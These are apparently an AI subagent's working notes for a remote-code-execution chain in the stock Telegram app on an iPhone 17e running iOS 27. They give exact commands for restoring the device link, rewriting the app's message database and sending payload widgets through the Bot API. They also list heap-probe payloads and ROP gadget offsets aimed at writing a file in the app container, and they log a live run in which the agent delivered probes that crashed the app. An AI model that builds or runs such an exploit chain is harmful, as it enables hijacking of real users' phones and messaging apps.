# iPhone 17e (iOS 27.0) — autonomous instrumentation plan for the parser 0day chain

Date: 2026-11-08 (~13:00 UTC). Author: subagent (host-side). **No live-device
operation was performed**: no install/launch/pull/attach/widget-deliver/bot
call. Everything below is either (a) verified host-side today, (b) verified in
prior sessions (with the reference note), or (c) explicitly marked ASSUMED /
DEVICE-QUESTION. The orchestrator owns every live operation.

Target: iPhone 17e `iPhone18,5`, iOS 27.0 build `24A437`, UDID
`<UDID>`, stock Telegram **13.2 (36535)**
`ph.telegra.Telegraph`, account **<CHAT_ID>** (<ACCOUNT_NAME>), account dir
`account-<ACCOUNT_ID>`, bot **<BOT_USERNAME>** (<CHAT_ID>).
Chain: parser 0day hole-reuse stage A (C=34, class 976) + same-view stage B +
inline ROP (6s-proven at `lab/ios_way`, geometry notes
`telegramandroidwidget/notes/ios_way_20261108.md`).

---

## 1. Device state as measured today (read-only)

| item | state | evidence |
|---|---|---|
| 17e on USB bus | **YES** — `Bus 002 Dev 031, 05ac:12a8`, bcdDevice `18.05` (=iPhone18,5), iSerial `<UDID>` | `lsusb -v`, pyusb descriptor dump |
| UDID | `<UDID>` | USB iSerial + `pymobiledevice3 doctor` |
| ECID | **unknown** (no lockdown access today) | must run `pymobiledevice3 lockdown info` after transport recovery (`UniqueChipID`) |
| usbmuxd | running v1.1.1 (Debian), **does NOT list the device** | `pymobiledevice3 usbmux list` → `[]`; `--simple` → `[]` |
| usbmuxd sees the device at USB level | **YES — it activates it**: config flips 3→4 (PTP+mux+Ethernet), ipheth binds | sysfs `bConfigurationValue` 3→4 across restarts |
| phone-side mux listener | **STALLs every usbmux packet** (ReadBUID / ListDevices / Connect → pipe error), even after dev.reset()+halt clear | raw pyusb probe `/tmp/opencode/mux_probe.py` |
| pairing record | present, Nov 7 12:55, has EscrowBag, WiFiMAC `<MAC>` | `/var/lib/lockdown/<UDID>.plist` |
| doctor verdict | "Device plugged in: iPhone (<UDID>...) — the host sees it, usbmux does not. fix: restart the usbmux daemon, and make sure the device is **unlocked and trusted**" | `pymobiledevice3 doctor` |
| DDI mounted | **cannot query** (no lockdown). Was mounted 2026-11-05/06 (`mounter list` showed the image). | notes/ios27_exploit_status_20261106.md §7 |
| Frida on the 17e | **none for the stock app — impossible** (no jailbreak, no frida-server, App Store apps have no get-task-allow and cannot embed a gadget). Frida works only on the dev-signed sideload via the jailed injector. | ios_sideload/notes/frida_hang_playbook.md |
| CoreDevice | CLI present (pymobiledevice3 11.49.2, services verified below); device-side reachability **cannot be verified until transport recovers**. | `--help` dumps |
| host Frida version | 17.26.0 (pip) | `frida --version` |

### Diagnosis of the dead transport (what I did, all host-side)

1. `pymobiledevice3 usbmux list` → `[]` (device on bus, daemon running).
2. `sudo -n systemctl restart usbmuxd` ×4, with 5–15 s waits → still `[]`.
3. Full AGENTS.md recovery: `sudo -n systemctl stop usbmuxd` → pyusb
   `dev.reset()` OK → `sudo -n systemctl start usbmuxd` → still `[]`.
4. Detached the `ipheth` kernel driver from the AppleUSBEthernet iface and set
   config 3 (PTP+Apple Mobile Device) — `set_configuration(3)` OK. usbmuxd
   re-activated config 4 itself → proves usbmuxd *detects and configures* the
   device but its lockdownd **preflight** fails, so the device never enters the
   device list (usbmuxd 1.1.x lists a device only after a successful
   lockdownd handshake).
5. Raw mux probe (usbmuxd stopped; direct bulk to the phone's Apple USB
   Multiplexor interface 1, eps 0x04/0x85): ListDevices / Connect(0,0xF27E) /
   ReadBUID all **STALL (pipe error)** — the phone-side mux is not serving.
6. Re-verified with `pymobiledevice3 doctor` — matches exactly.

**Conclusion:** the phone's mux is mute in its current state (screen locked/
asleep, or a pending "Trust This Computer" prompt, or a stale mux after the
last Frida/forward session). No host-side-only recovery exists for that:
`sudo -n` on this host is passwordless **only** for
`systemctl {start,stop,restart} usbmuxd` (`sudo -l`), so the sysfs/udev
deactivate path (the udev rule `ATTR{bConfigurationValue}=0` on add) cannot be
run by me. The device needs a **physical wake/unlock (and Trust tap if shown)**.

---

## 2. USB / transport recovery procedure (exact commands)

Step 0 — **physical (orchestrator/user)**: wake the phone (side button/tap),
unlock it to SpringBoard, and if the "Trust This Computer?" dialog appears,
tap **Trust**. Keep it unlocked during all transfers. This step is the
documented missing ingredient (usbmuxd 1.1.1 hides the device until the
lockdownd preflight/pair validation succeeds).

```sh
# 1. Kill stale forwarders (the known trigger of the iOS 27 link bug)
pkill -f 'pymobiledevice3 usbmux forward' || true
pkill -f '/idund' || true

# 2-5. The dance (loop up to 3 times if the list stays empty)
for i in 1 2 3; do
  sudo -n systemctl stop usbmuxd
  sleep 2
  <HOME>/ailocal/Telegram/ios_sideload/venv/bin/python - <<'PY'
import usb.core, time
dev = usb.core.find(idVendor=0x05ac, idProduct=0x12a8)
try:
    dev.reset(); print("reset OK")
except Exception as e:
    print("reset failed:", e)
    for j in range(4):          # AGENTS.md fallback
        dev = usb.core.find(idVendor=0x05ac, idProduct=0x12a8)
        try:
            dev.set_configuration(3); print("set_configuration(3) OK"); break
        except Exception as e2: print("setcfg busy:", e2); time.sleep(1.5)
PY
  sudo -n systemctl start usbmuxd
  sleep 5
  if <HOME>/ailocal/Telegram/ios_sideload/venv/bin/pymobiledevice3 usbmux list | grep -q <UDID>; then
    echo RECOVERED; break
  fi
  echo "attempt $i failed"
done
```

If still empty: **replug the cable with the phone awake+unlocked**, then repeat
steps 2–5. (Verified trigger + fix reference:
`ios_sideload/notes/usb_link_bug_20261106.md` — a stale `usbmux forward
--daemonize` / abandoned `frida -f` / `idund` leaves the mux config busy.)

Once the UDID appears:

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
# pairing / identity check (also answers the ECID question)
$VENV/pymobiledevice3 lockdown info                 # look for UniqueChipID, ProductType, BuildVersion
# developer-mode + DDI state
$VENV/pymobiledevice3 mounter query-developer-mode-status
$VENV/pymobiledevice3 mounter list                    # mounted images
# (re)mount the DDI if missing (known-good from the frida playbook):
$VENV/pymobiledevice3 mounter auto-mount --userspace
# sanity: CoreDevice over the userspace tunnel
$VENV/pymobiledevice3 developer core-device get-device-info --userspace
```

DDI note: if `mounter list` is empty, `auto-mount` fetches/mounts the iOS 27.0
(24A437) image. The 2026-11-06 note warns that frida sometimes reports
"requires an iOS Developer Disk Image" even while `mounter list` shows it
mounted — a transport artifact; re-verify with `mounter list`, do not treat it
as a real unmount. iOS 17+ developer services additionally require a tunnel:
`--userspace` (pure-python, no root) or `pymobiledevice3 remote tunneld`.

---

## 3. Frida attach (17e) and widget delivery for the stock app

### 3.1 Frida on the stock app: NOT POSSIBLE (dead end, do not attempt)

No jailbreak → no frida-server; App Store apps have no `get-task-allow` and
cannot embed FridaGadget; the jailed injector requires a dev-signed app. Frida
**cannot attach to `ph.telegra.Telegraph`** on this device. All 6s-style
Frida delivery (`deliver_n1_6s.py` / `deliver_n1_wifi.py`, the
`debugInsertLocalWidgetMessages` engine call) is therefore **6s-only**.

### 3.2 Frida on the sideload surrogate (instrumentation only, not geometry)

The dev-signed `com.user.tg72799.B472R2D493` (13.2/36535, no gadget,
`get-task-allow`) is the only Frida-able process. It is a bad geometry
surrogate (its heap differs from stock; large payloads render empty — proven
Nov 6), but it is valid for **constant validation** (open/read/write deltas,
rt layout) exactly like the Nov 6 `frida_syscall_test.py` did.

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
$VENV/pymobiledevice3 mounter auto-mount --userspace          # DDI required
# spawn-only (NOT -n / -p: no page-plan servicer otherwise), gadget 17.25.2:
$VENV/frida -D <UDID> \
  -f com.user.tg72799.B472R2D493 \
  --aux 'gadget=(string)/tmp/opencode/frida_fix_history/gadget-17.25.2-arm64.dylib' \
  -l script.js
```

Rules (all from prior sessions, see
`ios_sideload/notes/frida_hang_playbook.md` and
`notes/ios27_exploit_status_20261106.md` §7):

- After `script.load()` the **main thread is frozen** — call
  `dev.resume(pid)` via DVT (`ProcessControl.resume_pid_`) right after load;
  with the resume the app stays usable. (CLI has no resume subcommand; use a
  small python snippet: `pymobiledevice3.services.dvt...ProcessControl.resume(pid)`
  over the same DVT connection, or keep the frida_syscall_test.py pattern.)
- Frida **17.26 API differences**: `Module.findExportByName` is absent — use
  `Process.getModuleByName(m).findExportByName(n)`; `ObjC`/`Swift` bridges are
  undefined in 17.x agents; `Memory.scanSync` returns match **objects**
  `{address,size}`, not `NativePointer`s.
- If `Spawning ...` hangs: iOS 27 debugproxy needs the pre-attach
  `vAttach;<pid>`; fall back to manual LLDB (playbook §3) — LLDB also works
  on the sideload (`pymobiledevice3 developer debugserver lldb <bundle>
  --launch`, needs a PTY: `script -qfc ...`).
- Never leave `usbmux forward --daemonize` or `idund` running; kill before/after.

### 3.3 Widget delivery to the STOCK app

Two channels; **the Frida message insert is not one of them** (see 3.1).

**Channel A — Postbox DB insert (t7 zlib row), CoreDevice fileservice**
(needs DDI + tunnel; used exactly like the 6s tooling):

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
GROUP=telegram-data/account-<ACCOUNT_ID>/postbox/db
mkdir -p /tmp/opencode/ios17e_db && cd /tmp/opencode/ios17e_db

# A1. kill the app first (orchestrator: dvt kill / crash-safe; Postbox must checkpoint)
# A2. pull the DB + WAL + SHM (DEVICE-QUESTION 0: does appGroupDataContainer resolve for the STOCK bundle id?)
$VENV/pymobiledevice3 developer core-device read-file appGroupDataContainer \
  "$GROUP/db_sqlite" --identifier ph.telegra.Telegraph \
  --output /tmp/opencode/ios17e_db/db_sqlite --userspace
$VENV/pymobiledevice3 developer core-device read-file appGroupDataContainer \
  "$GROUP/db_sqlite-wal" --identifier ph.telegra.Telegraph \
  --output /tmp/opencode/ios17e_db/db_sqlite-wal --userspace
$VENV/pymobiledevice3 developer core-device read-file appGroupDataContainer \
  "$GROUP/db_sqlite-shm" --identifier ph.telegra.Telegraph \
  --output /tmp/opencode/ios17e_db/db_sqlite-shm --userspace
cp db_sqlite db_sqlite-wal db_sqlite-shm backup/ 2>/dev/null || mkdir -p backup && cp db_sqlite* backup/

# A3. discover widget rows (t7 peer|ns|ts|id key; HTML head 120 B)
python3 <HOME>/ailocal/Telegram/telegramandroidwidget/lab/ios_way/tools/postbox_rewrite_widget.py \
  --db db_sqlite --list

# A4. rewrite a row (same key = same message/widget id; zlib stream + 4-byte LE
#     length replaced, every other serialization byte preserved)
python3 <HOME>/ailocal/Telegram/telegramandroidwidget/lab/ios_way/tools/postbox_rewrite_widget.py \
  --db db_sqlite --ns 1 --message-id <seed_row_id> \
  --html <payload.html> \
  --out db_sqlite.new [--expect N1IOS_SEED] [--preserve-length --pad-html]

# A5. push the single checkpointed DB back; drop stale WAL/SHM
$VENV/pymobiledevice3 developer core-device write-file appGroupDataContainer \
  "$GROUP/db_sqlite" --identifier ph.telegra.Telegraph \
  --input /tmp/opencode/ios17e_db/db_sqlite.new --userspace
$VENV/pymobiledevice3 developer core-device remove-file appGroupDataContainer \
  "$GROUP/db_sqlite-wal" --identifier ph.telegra.Telegraph --userspace
$VENV/pymobiledevice3 developer core-device remove-file appGroupDataContainer \
  "$GROUP/db_sqlite-shm" --identifier ph.telegra.Telegraph --userspace

# A6. relaunch + open the chat (§4); rollback = restore backup/ files the same way.
```

AppGroup UUID (stock 17e, from the Nov 5/6 notes and the rw3 payload):
`00000000-0000-0000-0000-000000000000`
(full path `/private/var/mobile/Containers/Shared/AppGroup/<APPGROUP>/telegram-data/…`).
**DEVICE-QUESTION 0**: `ios27_iphone17_test.md` says the stock app's data
container fails with `InstallationLookupFailed` via CoreDevice/house_arrest;
whether the `appGroupDataContainer` domain resolves for
`ph.telegra.Telegraph` is **unverified** — it is the very first device test.
If it fails: Channel B (below) or `pymobiledevice3 backup2` (encrypted
backup contains the AppGroup domains; extract → modify → selective restore —
heavy, restores require care; only with explicit orchestrator approval).

**Channel B — Bot API beta `sendWidget`** (the proven stock-17e channel;
message 724 / `W17BOT_OK`, Nov 5). Requires the user's explicit authorization
per project rules:

```
POST https://api.telegram.org/beta/bot<TOKEN>/sendWidget
{ "chat_id": <CHAT_ID>, "widget": "<html>" }
```

- At the time of this run (13:30), only the **beta** prefix worked (the stable base returned 404).

  > Update 2026-11-08: the standard prefix now serves `sendWidget` natively.
  > Both bases work; the beta line is the 13:30 measurement.
- Each `sendWidget` = a **new** message id → the `localStorage` same-widget-id
  designs (ls_seed → ls_final) cannot be seeded by two sendWidget calls.
  Compatible 17e designs: the **attribute variants** (`at_probe_h*`,
  `at_final_h*`, `at_rop_final_h*` — single widget, no storage) and the
  initial **hole_stageA probes**. For the inline/localStorage design, the
  seed must be delivered once (Channel A or B) and the same row rewritten
  (Channel A) — that is exactly the 6s §3.6.19–3.6.23 flow.

---

## 4. Chat-open automation (autonomous) + verification

Goal: the <BOT_USERNAME> chat (peer <CHAT_ID>) open with the widget row
visible, without touching the phone.

1. **Primary — relaunch-to-last-chat** (Telegram restores the last open chat;
   used implicitly by the 6s flow):
   - Make sure the bot chat is on screen before the kill (any step that kills
     the app).
   - Relaunch: `pymobiledevice3 developer core-device launch-application
     ph.telegra.Telegraph --no-kill-existing --userspace`
     (drop `--no-kill-existing` when a kill is wanted). Note: **do not** use
     DVT `launch --stream` for normal use — it kills the app when the stream
     detaches.
   - New widget rows are inserted at the bottom; the app opens at the last
     scroll position. If the bubble is below the fold, a swipe/scroll is
     needed (WDA fallback, #4).
2. **URL open `tg://resolve?domain=<BOT_USERNAME>`** — two unverified options
   (ASSUMED, validate in Test 1 before relying on them):
   - DVT: python snippet calling
     `launch_suspended_process_with_device_path_bundle_identifier_environment_arguments_options_`
     with `options={"UIApplicationLaunchOptionsURLKey":
     "tg://resolve?domain=<BOT_USERNAME>"}` (the standard UIKit launch
     option; the CLI does not expose `options`, use `developer shell` or a
     script).
   - CoreDevice `com.apple.coredevice.open` (OpenApplicationService) via
     `pymobiledevice3 remote service … com.apple.coredevice.open` R&D shell
     (this pymobiledevice3 version does not wrap it; the service/feature
     identifiers are Xcode 26 internals — probe with the shell).
   - The 6s used the jailbreak `uiopen --url "tg://resolve?domain=<BOT_USERNAME>"`
     — **unavailable** on the stock 17e.
3. **CoreDevice HID** (`hid button home`, `press`, `unlock` via WDA) can wake/
   home/unlock but cannot tap coordinates.
4. **WDA fallback** (full autonomy; requires installing a dev-signed
   WebDriverAgentRunner — orchestrator install, bundle not present on disk):
   `pymobiledevice3 developer wda launch ph.telegra.Telegraph`, then
   `wda list-items`, `wda tap` (e.g. the bot chat cell / search),
   `wda type`, `wda screenshot`. Also the accessibility inspector
   (`developer accessibility list-items/element-attributes`) for read-only
   verification.

**Verification it opened** (screenshot):

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
$VENV/pymobiledevice3 developer core-device screen-capture screenshot /tmp/opencode/ios17e/shot1.png --userspace   # preferred (CoreDevice)
$VENV/pymobiledevice3 developer dvt screenshot /tmp/opencode/ios17e/shot2.png --userspace                          # DVT fallback
$VENV/pymobiledevice3 developer screenshot /tmp/opencode/ios17e/shot3.png --userspace                              # deprecated API, last resort
```

The widget's own DOM `#v` text is the marker channel (the 6s lessons: the
chat renderer can show empty cells while C2/printf is the only reliable
verdict; on the 17e there is no Frida printf hook, so the screenshot of `#v`
plus the `--console` stdout capture below are the two channels).

**Marker channel 2 — app stdout via CoreDevice** (the 17e replacement for the
6s Frida printf hook): relaunch with
`pymobiledevice3 developer core-device launch-application ph.telegra.Telegraph
--console --userspace` — wires the process stdout/stderr through a PTY, so
libc `printf` from the widget thread (the stage-B `N1IOS_*` markers) appears
in the CLI (ASSUMED to work exactly like the Frida hook did on the 6s; the 6s
hook observed plain `printf` output — validate in Test 1). Run it in a
background log file and tail.

---

## 5. Screenshot + crash pull (CoreDevice/lockdown)

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
# screenshots: §4.  Crash reports (lockdown service; works without DDI once usbmux is up):
$VENV/pymobiledevice3 crash ls                      # list .ips
$VENV/pymobiledevice3 crash pull -o /tmp/opencode/ios17e/crashes    # pull all
$VENV/pymobiledevice3 crash flush                   # force crashreportmover flush (fresh crashes)
# CoreDevice variant (DDI):
$VENV/pymobiledevice3 developer core-device list-directory systemCrashLogs / --userspace
$VENV/pymobiledevice3 developer core-device read-file systemCrashLogs Telegram-<ts>.ips \
  --output /tmp/opencode/ios17e/crashes/x.ips --userspace
# live logs for the parser-stage diagnosis:
$VENV/pymobiledevice3 syslog live | grep -i telegram     # (or developer dvt oslog)
$VENV/pymobiledevice3 developer dvt proclist --userspace # PID discovery
```

---

## 6. Parser-chain test sequence for the 17e

Payloads: `telegramandroidwidget/lab/ios_way/payload/` (hashes in
`ios_way_20261108.md` §3.6 tables). Delivery: Channel A (DB rewrite) or
Channel B (bot, authorized). **Do not touch the tops-test chat on the 6s —
irrelevant here; on the 17e keep the <BOT_USERNAME> chat clean between
variants** (delete each variant row after reading; never cold-open a chat with
a parser widget in history — the 6s crash rule).

### 6.1 Preflight

1. Recover transport (§2), wake+unlock+Trust (physical).
2. `lockdown info` → record ECID/Build; `mounter list` → DDI; `auto-mount
   --userspace` if needed.
3. **Consider a phone reboot** (orchestrator decision): the 17e widget renderer
   went blank on Nov 6 even for a minimal VRUN9 widget
   (`notes/ios27_exploit_status_20261106.md` §6, §9.2 recommends a reboot).
4. Snapshot the bot chat/DB (`Channel A` pull; `backup/` copy) before the
   first insert.

### 6.2 Probe first (stage A only — no stage B, no writes)

Order: **h400 → h200 → h64 → h500** (6s device order; H is app-heap-state
dependent, so a miss is not final — retry).

| step | payload (raw/zlib9) | expected `#v` |
|---|---|---|
| P1 | `hole_stageA_probe_h400.html` (1,927/889) | `RESULT HOLE C=34 SZ=957 N=3000 H=400 HN=64 HIT=<i> LEN=327744 PH=<p> VK=<v> NT=<n>` |
| P2 | h200 / h64 / h500 | same shape |

- `HIT=-1 LEN=0` → safe miss (target in the spray, phase/victim miss): next H.
- `RESULT NO_TOPS` → the engine wrapped the script (eval wrapper) — the
  function geometry changed; **do not run any final**; report the delivery
  form.
- parser-stage crash `TelegramUIFramework+0x3F48820/0x3F487E8`
  (`add_closure_variables` / `JS_DupAtom`) → the target left the spray for
  that H; pull the `.ips` (§5), delete the row, next H, relaunch.
- **iOS 27 geometry caveat**: `PH`/`NT` on the 17e will almost certainly
  differ from the 6s (`PH=36 NT=21` on the 6s fs-probe; `PH=12` on the
  earlier probe) and from glibc (`PH=12/28`). The stage A sweeps 5 phases ×
  5 victims per run (NT≤25), so a hit at ANY phase is valid. If all four H
  probes miss or crash on iOS 27, the Apple tiny-class prediction (request
  965 → class 976, q=604) is wrong for iOS 27's malloc: next levers are the
  dense-H set (0/50/150/250/300/350/450/550/600 payloads exist for the
  at_/ls_ families; for the plain probe only h64/100/200/400 exist — build
  more with `tools/gen_hole_stageA.py`) and then C=33/35 + N/HN tuning
  (`ios_way_20261108.md` §1 table, §10).

### 6.3 Final — attribute variant (printf proof, no storage, no second script)

Only after a probe HIT. Same H as the probe.

| step | payload (raw/zlib9) | expected |
|---|---|---|
| F1 | `at_probe_h<H>.html` (6,801/1,050) | `RESULT ATTR … HIT=<i> LEN=327744 PH=.. VK=598 NT=.. S2LEN=3617` (S2LEN=-1 ⇒ attribute binding missing ⇒ stop) |
| F2 | `at_final_h<H>.html` (6,801/2,528) | `ABV k=80 … IOS_N1_OK base=0x… printf=0x… rt=0x… D=0x… leak=FORGED`; then `N1IOS_*` printf lines via `--console` (channel 2) |

The at_ family is **iOS-27-ready as-is**: the stage B resolves `free` from the
PLT stub (`rd32(js_free)==0xaa0103e0` arm64 stub decode), base via
`JS_DEF_FREE = 0x3f4f174` (verified byte-identical on 13.2/36535 for both
devices), and it does **not** use a pivot/ROP — no iOS 27 constant changes
needed.

### 6.4 ROP — the 17e port (rebuild required before delivery)

The shipped ROP payloads (`at_rop_final_h*_ios.html`, `ls_final_inline_h*_ios_4600_ub.html`)
embed **6s/iOS 15.8.8 constants** and the 6s container path (verified by
string scan of `ls_final_inline_h200_ios_4600_ub.html`: `0x66cccfc`,
`0x296b394c`, `<APP_UUID>/Documents/rce.txt`). Rebuild with the iOS 27
(24A437) constants (`notes/ios27_exploit_status_20261106.md` §3 — device
cross-checked on the connect run):

| slot | 6s (15.8.8) | **17e (iOS 27.0 24A437)** |
|---|---|---|
| PIVOT2 (rt+0x20) | `libcFree − 0x66cccfc` (JSC `mov sp,x0; ret`) | **`libcFree + 0xB6583074`** (IntelligenceFlowRuntime+0x64510, bytes `1f 00 00 91 c0 03 5f d6`) — the device-proven iOS 27 entry ("not a plain pivot but an authenticated dispatch; the chain enters anyway" — proven by the rw3 CONN on the 17e) |
| `open` | `+0x296b394c` | **`+0xB79B52BC`** |
| `write` | `+0x296b3738` | **`+0xB79B3B8C`** |
| `pthread_exit` | `+0x4a21a474` | **`−0x88AC`** (thread-only exit; app survives) |
| rce.txt path | `/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt` (102 chars) | **`/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt`** (91 chars; length equality with the 6s path is not achievable with whole `/./` groups (91+3n) and is **not required** — the builder recomputes layout offsets and the preserve-length padding re-tunes to the seed's 4,600/2,124 pair) |
| G_CALL / G_LOAD / G_X0 | base+`0x3292c` / `0x172d96c` / `0x628a2c` | same (identical 13.2/36535 binary, verified) |
| free GOT read | `_(T+0x69091f8)` | same |
| JS_DEF_FREE / Mach-O magic | `0x3f4f174` / `0xfeedfacf` | same |

Hex-length note: the constant edits (`-0x66cccfc` → `+0xB6583074`, `+0x4a21a474` → `-0x88ac`) and the shorter path change the inline script source length slightly; the builder recomputes the layout, and Channel A's `--preserve-length --pad-html` re-tunes the row to the seed's exact uncompressed+compressed pair (4,600/2,124). The stage-A/geometry H for the rebuilt payload is unknown a priori (the 17e allocator differs) — that is what the dense-H sweep is for. Rebuild via
`tools/make_inline_ub_pair.py` (4600 family) / `tools/make_at_rop_dense.py`
(at_rop family), re-verify sizes + `node --check`, then the preserve-length
rewrite (identical to the 6s §3.6.23 invocation, with the 17e files).

**Sequence (inline design, 4,600/2,124 pair):**

1. Seed row: `ls_seed_inline_4600_ub.html` (`N1IOS_SEED_INLINE`, `SEED OK 3617`)
   — one widget, delivered by Channel B (or A).
2. Kill app → Channel A pull → preserve-length rewrite the **same row** to
   `ls_final_inline_h200_ios_4600_ub_17e.html` (the 17e rebuild) → push →
   remove WAL/SHM → relaunch (§4) → screenshot + `--console` log.
3. `#v` decision tree (same as the 6s, §3.6.23):
   - `HIT=<H> LEN=327744 … S2LEN=3617 … U_RDY 0x… D=0x… DL=0x… O=±0x… RT=0x… PATH=…`
     → chain built; the pivot then fires; **`U_AFTER` must NOT appear**;
     proof = `rce.txt` in the AppGroup. Read it back via Channel A
     (`read-file appGroupDataContainer rce.txt --identifier ph.telegra.Telegraph`)
     if DEVICE-QUESTION 0 resolves, else a follow-up read-back widget, else
     screenshot + no-U_AFTER as the proof. The 6s file was `RCE_OK\n` with a
     stale 2026-11-05 mtime — on the 17e the AppGroup path is a **fresh file**
     (no previous `rce.txt` there; the Nov 6 #1827 proof wrote elsewhere), so
     the content itself (`RCE_OK\n`) is the proof.
   - `U_NF D=…` → UB not within ±64 KiB of D (the iOS 27 malloc may place it
     differently than the 6s `O=-0x390/-0x3d0/-0x49a0`): report `O`, next H.
   - `U_NO_FREE` / `NO_BASE` → resolver; report (`free` GOT read at
     `base+0x69091f8` — the same read the rw3 chain used).
   - parser crash `0x3F48820/0x3F487E8` → H shifted (the 17e pre-heap
     differs from the 6s); next H.
   - `U_EXC`/no marker → ROP JS exception; report marker+`.ips`.
4. H order: **h200 → h150 → h250 → h300 → h400 → h100 → h500 → h600 → h0**
   (dense set exists for the 4600 family; the 17e hit-H is unknown — the
   Apple allocator on iOS 27 differs from 15.8.8, so treat the 6s hit-H as a
   hint, not a fact). One rewrite+push+relaunch per H.
5. Attribute-ROP single-widget alternative if storage/DB is blocked:
   rebuilt `at_rop_final_h{H}_ios_17e.html` (single widget, no seed/no row
   rewrite; Channel B deliverable; `S2LEN=6011` read + inline ROP).

### 6.5 Known-good 17e runtime values (from the rw3/#1827 stock proof)

`free 0x1934fc49c …` unslid cache anchor; runtime: `rt=…` per run — the
24A437 slide is ~`0x12FB4000` (typical). The stage B prints all of them;
record `base/printf/rt/D` for the next run.

---

## 7. Honest verified-vs-assumed summary

**Verified today (host-side, read-only):** 17e on the bus with the right
UDID; usbmuxd detects+activates it but does not list it; the phone-side mux
STALLs protocol packets; pairing record present; `doctor` agrees; the
passwordless sudo surface is exactly `systemctl {start,stop,restart} usbmuxd`;
all pymobiledevice3 11.49.2 CLI surfaces (CoreDevice files/screen-capture/
launch/hid, DVT, mounter, crash, syslog, backup2) exist.

**Verified from prior sessions (cited):** USB bug + recovery dance; Frida
17.26 API differences + `dev.resume(pid)`; sideload-only Frida; the
`InstallationLookupFailed` for the stock app data container; the AppGroup
UUID; the t7 row format + rewrite tool host tests; the 6s end-to-end markers
and decision trees; the iOS 27 libc table and pivot dispatch.

**Assumed / device-questions (order of first test):**
0. Does `appGroupDataContainer` resolve for `ph.telegra.Telegraph`?
1. Does `launch-application --console` capture the widget-thread `printf`
   markers (and does the tg:// URL open path work)?
2. Does the 17e reopen into the bot chat (last-chat restore)?
3. Does the Apple iOS 27 tiny-zone honor class 976 / the C=34 geometry (the
   probe answers it; the H/PH sweep is the designed fallback)?
4. Does the rw3-proven `libcFree+0xB6583074` dispatch pivot behave the same
   under the parser chain's free-path trigger?

**Hard no:** Frida/LLDB on the stock app; jailbreak tools on the 17e;
`sendfile` in any chain (SIGSYS); renaming QuickJS string-pool entries; any
bot/network/device action without orchestrator/user approval.

## 8. Artifacts

- This note: `notes/ios17e_instrument_20261108.md`
- Facts: `notes/LEMMALOG_FACTS_ios17e_instrument_20261108.txt`
- Probe script (host-side diagnostic): `/tmp/opencode/mux_probe.py`
- Tooling references: `telegramandroidwidget/lab/ios_way/{payload,tools}/`,
  `lab/qjs_postsnapshot/ios_n1/` (6s delivery), `ios_sideload/notes/*`,
  `notes/ios27_exploit_status_20261106.md`, `notes/ios27_iphone17_test.md`,
  `notes/ios17_session_c2.md`, `telegramandroidwidget/notes/ios_way_20261108.md`

---

## 9. LIVE RUN 2026-11-08 13:30–14:10 UTC (execution of this plan)

The orchestrator role was delegated to this subagent for this run; all device
operations below were performed live on the 17e.

### 9.1 Device verification after the user's re-flash (13:30 UTC)

| check | result |
|---|---|
| USB/usbmux | `05ac:12a8` bus2 dev35; usbmux lists `<UDID>` |
| lockdown | OK (Trust valid); iPhone18,5, iOS 27.0 24A437, ECID `<ECID>`, serial `<SERIAL>` |
| developer mode / DDI | `true`; DeveloperDiskImage 642.4 mounted `/System/Developer` |
| stock app | `ph.telegra.Telegraph` 13.2 (36535), container `00000000-0000-0000-0000-000000000000`, AppGroup `00000000-0000-0000-0000-000000000000` (unchanged) |
| sideload | `com.user.tg72799.B472R2D493` 13.2 (36535), group `F6E34178-…` |

**DEVICE-QUESTION 0 answered: NEGATIVE.** `appGroupDataContainer` with
`--identifier group.ph.telegra.Telegraph` → `ContainerLookupErrorDomain`
ErrorCode 7 (and `appDataContainer` → ErrorCode 3); the same domain resolves
`group.com.user.tg72799.B472R2D493` → `[]`. Channel A (Postbox t7 rewrite)
is therefore **unavailable for the stock app** on this device; Channel B (bot
beta `sendWidget`) is the delivery path.

### 9.2 Channel B proven end-to-end

- Benign ping widget (message 16809, `CH17E_PING_20261108_1345`,
  `allow_queries=true`) executed on the phone: the Pixel-lab OOB server log
  (`lab/pixel72801_route2/oob/state/server.log`) recorded
  `2026-11-08 13:46:35 SKIP uid <CHAT_ID>` — the widget's
  `TelegramWidget.request` reached the Bot API from the stock account.
- Widget `#v` marker readback: **CoreDevice screenshot + OCR** (rapidocr,
  `/tmp/opencode/ocrvenv`). The ping's `#v` showed `ERR TIMEOUT` (the Pixel
  OOB server answers only its own uid), confirming render+execution.
- The bot token in `/tmp/opencode/tgbot/token.env` is <BOT_USERNAME> (<CHAT_ID>);
  the Pixel-lab `oob/bot_server.py` owns the token's `getUpdates` — no second
  poller was run.

### 9.3 Chat-open automation (no user input needed)

- DVT `launchSuspendedProcessWithDevicePath:…options:` with
  `UIApplicationLaunchOptionsURLKey` (tg://resolve?domain=<BOT_USERNAME> or
  t.me/<BOT_USERNAME>): **FAILS** on iOS 27 — the app restarts to the chat list and
  the userspace tunnel drops (CancelledError).
- **CoreDevice universal HID works**: `universal-hid-service tap/type/…`
  (0..65535 normalized coords) + OCR-driven navigation opens the chat
  deterministically (tap search icon → tap field → type `<BOT_USERNAME>` → tap
  result). Helper: `/tmp/opencode/ios17e/nav.py`.
- Crash containment: opening the chat re-renders widget cells, so a crashing
  probe in history kills the app on open (documented 6s rule). Fixed by
  deleting each probe message via Bot API `deleteMessage` before reopening.

### 9.4 Parser stage-A probe results on iOS 27 (plain C=34 hole payload)

All deliveries: `sendWidget` to chat <CHAT_ID>, one widget per message,
message deleted after reading; marker read by OCR of the newest `#v` line.

| payload | result |
|---|---|
| `hole_stageA_probe_h400.html` | `HIT=-1 LEN=0 PH=-1 VK=-1 NT=25` (safe miss) |
| `hole_stageA_probe_h200.html` | safe miss (NT=25) |
| `hole_stageA_probe_h64.html` | **parser-stage crash** (app died; removed) |
| `hole_stageA_probe_h500.html` (generated) | safe miss (NT=25) |
| dense H: 100,150,250,300,350,450,550,600 | all safe miss (NT=25) |
| descending-range H: 1400,1600,2000,2400,2800 (N=3000) | all safe miss |
| phase-base-0 (PH={0,8,16,24,32}) H400/H64 | safe miss |
| N=5000 H0/H100/H400 | safe miss |
| HN=256 H64/H400 | safe miss |
